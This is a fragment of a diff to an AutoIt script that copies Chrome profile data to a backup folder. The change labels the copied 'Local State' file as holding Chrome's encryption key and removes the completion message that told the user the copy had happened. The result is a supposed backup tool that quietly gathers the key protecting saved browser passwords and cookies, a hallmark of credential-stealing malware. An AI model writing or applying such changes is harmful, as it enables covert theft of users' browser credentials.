@@ -43,8 +43,5 @@ While 1
 WEnd
 FileClose($search)
 
-; Backup the 'Local State' file
+; Backup the 'Local State' file - contains encryption key
 FileCopy($chromeDataPath & "\Local State", $backupPath & "\Local State", $FC_OVERWRITE)
-
-; Display completion message
-MsgBox($MB_OK, "Backup Complete", "Chrome data has been backed up to:" & @CRLF & $backupPath)
